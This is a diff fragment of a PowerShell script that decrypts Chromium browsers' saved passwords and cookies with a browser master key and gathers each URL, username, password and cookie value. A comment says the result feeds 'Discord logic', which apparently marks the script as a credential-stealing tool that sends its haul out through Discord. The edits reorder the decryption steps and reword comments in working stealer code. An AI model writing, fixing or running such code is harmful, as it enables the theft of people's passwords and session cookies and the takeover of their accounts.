@@ -881,18 +881,18 @@ if (-not ($Browser)){
     }
 
 # ------------------------------------------------------------------
-    # 4. DECRYPT EVERYTHING (Direct Logic - No function call needed)
+    # 4. DECRYPT EVERYTHING (Direct Logic)
     # ------------------------------------------------------------------
     $DecryptedLogins = @()
     foreach ($Entry in $BrowserData) {
         try {
             $RawData = [Convert]::FromBase64String($Entry.Base64EncryptedPassword)
-            # Standard Chromium decryption: Nonce is 12 bytes after the 'v10' header
+            # Chromium format: v10 (3 bytes) + Nonce (12 bytes) + Ciphertext + Tag (16 bytes)
             $Nonce = $RawData[3..14]
-            $Ciphertext = $RawData[15..($RawData.Length - 17)]
             $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
+            $Ciphertext = $RawData[15..($RawData.Length - 17)]
             
-            # This uses the BCrypt/NCrypt calls already defined in your script
+            # Using the Decrypt-AESGCM function already present in your script
             $Pass = Decrypt-AESGCM -Key $MasterKey -Nonce $Nonce -Ciphertext $Ciphertext -Tag $Tag
             $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = $Pass }
         } catch { 
@@ -905,8 +905,8 @@ if (-not ($Browser)){
         try {
             $RawData = [Convert]::FromBase64String($C.Base64EncryptedValue)
             $Nonce = $RawData[3..14]
-            $Ciphertext = $RawData[15..($RawData.Length - 17)]
             $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
+            $Ciphertext = $RawData[15..($RawData.Length - 17)]
             
             $Val = Decrypt-AESGCM -Key $MasterKey -Nonce $Nonce -Ciphertext $Ciphertext -Tag $Tag
             $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = $Val }
@@ -914,7 +914,6 @@ if (-not ($Browser)){
             $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = "(Decryption Failed)" }
         }
     }
-
     # ------------------------------------------------------------------
     # 5. RETURN THE HASHTABLE (What the Discord logic expects)
     # ------------------------------------------------------------------
